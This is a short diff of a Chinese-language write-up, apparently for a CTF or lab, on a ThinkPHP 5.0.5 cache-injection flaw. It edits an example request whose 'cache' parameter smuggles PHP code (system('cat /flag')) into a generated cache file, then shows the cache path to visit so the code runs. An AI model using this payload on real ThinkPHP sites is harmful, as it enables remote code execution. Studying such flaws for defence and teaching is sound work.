@@ -72,8 +72,8 @@ tinkphp5.0.5默认控制器的部分代码，使用默认路由：
 
 缓存生成的路径和文件名是根据参数名的md5值计算的，这里是cache。
 ```
-?s=index/index/rce&cache=%0d%0asystem(%27cat%20/flag%27);//
-缓存路径： runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
+/public/index.php?s=index/index/rce&cache=%0d%0asystem(%27cat%20/flag%27);//
+再访问缓存路径： /runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
 ```
 
 
